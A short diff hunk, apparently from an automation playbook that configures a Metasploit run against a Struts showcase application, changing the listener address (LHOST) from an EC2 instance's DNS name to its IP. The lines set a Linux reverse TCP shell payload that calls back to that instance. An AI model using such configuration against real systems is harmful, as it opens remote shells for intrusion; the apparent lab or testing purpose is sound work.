@@ -23,7 +23,7 @@
 
           set RHOST http://{{ struts_route.stdout }}
           set RPORT 80
-          set LHOST {{ ec2_instance.instances.0.public_dns_name }}
+          set LHOST {{ ec2_instance.instances.0.public_ip_address }}
           set PAYLOAD linux/x64/shell/reverse_tcp
           set LPORT 5432
           set TARGETURI /showcase
